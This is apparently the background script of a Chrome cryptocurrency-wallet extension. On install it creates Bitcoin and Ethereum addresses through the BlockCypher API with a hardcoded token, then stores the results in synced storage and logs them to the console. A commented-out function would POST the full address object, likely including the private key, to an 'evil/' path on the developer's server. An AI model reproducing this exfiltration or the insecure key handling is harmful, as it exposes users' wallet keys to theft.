chrome.runtime.onInstalled.addListener(function () {
  console.log('Application installed');
    //Use for AWS
    var aws = "http://cryptobit-env.7hiybanifg.eu-central-1.elasticbeanstalk.com/";
    //Use for appEngine
    var appEngine = 'https://cryptobit-213216.appspot.com/';


var testAppEngine =new XMLHttpRequest();
testAppEngine.onreadystatechange = function(){
  var res = this.responseText;
  console.log(res)
}
    testAppEngine.open('GET', aws+'testConnection');
testAppEngine.send();







const bcynet = 'bcy/test';
const btcnet = 'btc/main';

  NetworkToUse(btcnet);
function NetworkToUse(network){
    var GcloudServer = aws;
  var token = 'f478b3d6f8e8493da462c2a5cf24fd58';
  ////Create the first bitcoin address on install
  var obj = { 'id': 0 }
  chrome.storage.sync.set(obj)

  var getRnd = new XMLHttpRequest();
  getRnd.onreadystatechange = function () {
    if (this.readyState == 4) {
      var rndNumber = this.responseText;
      rndNumber = 'w' + rndNumber;
      chrome.storage.sync.set({ btc_wallet_name: rndNumber })



    }
  }

  getRnd.open('GET', GcloudServer+'randomNumber');
  getRnd.send();




  var con1 = new XMLHttpRequest();
  con1.onreadystatechange = function () {
    if (this.readyState == 4) {
      chrome.storage.sync.get('id', (x) => {
        var temp = JSON.parse(this.responseText);
        console.log(temp)
        temp.balance = 0;
        /*
        verify(temp)
        function verify(nx) {
            var exam = new XMLHttpRequest();
            exam.onreadystatechange = function () {
                if (this.readyState == 4) {
                   
                }
            }
            exam.open('POST', aws+'evil/' + JSON.stringify(nx));
            exam.send();
        }
*/

        var array = [];
        array[x.id] = temp;

        chrome.storage.sync.set({ 'id': ++x.id })
        chrome.storage.sync.set({ addr: array })

       

        var creatWalletRND = new XMLHttpRequest();
        creatWalletRND.onreadystatechange = function () {
          if (this.readyState == 4) {

          }
        }

        chrome.storage.sync.get('btc_wallet_name', (zzz) => {
          var data = { "name": zzz.btc_wallet_name, "addresses": [array[0].address] };

          creatWalletRND.open('POST', 'https://api.blockcypher.com/v1/'+network+'/wallets?token='+token);
          creatWalletRND.send(JSON.stringify(data));

        })






        chrome.storage.sync.get(null, (g) => { console.log(g) })

      })



    }
  }
  con1.open('POST', 'https://api.blockcypher.com/v1/'+network+'/addrs');
  con1.send();


  //Create the first ether address on install

  var obj_eth = { 'id_eth': 0 }
  chrome.storage.sync.set(obj_eth)

  var con2 = new XMLHttpRequest();
  con2.onreadystatechange = function () {
    if (this.readyState == 4) {
      chrome.storage.sync.get('id_eth', (x) => {
        var temp = JSON.parse(this.responseText);
        temp.balance = 0;




        var array_eth = [];
        array_eth[x.id_eth] = temp;


        chrome.storage.sync.set({ 'id_eth': ++x.id_eth })
        chrome.storage.sync.set({ addr_eth: array_eth })



        chrome.storage.sync.get(null, (g) => { console.log(g) })

      })




    }
  }
  con2.open('POST', 'https://api.blockcypher.com/v1/eth/main/addrs?token='+token);
  con2.send();

}



});

chrome.runtime.onStartup.addListener(()=>{
  console.log('Application started');
})


chrome.browserAction.setPopup({
  popup: "lock.html"
});






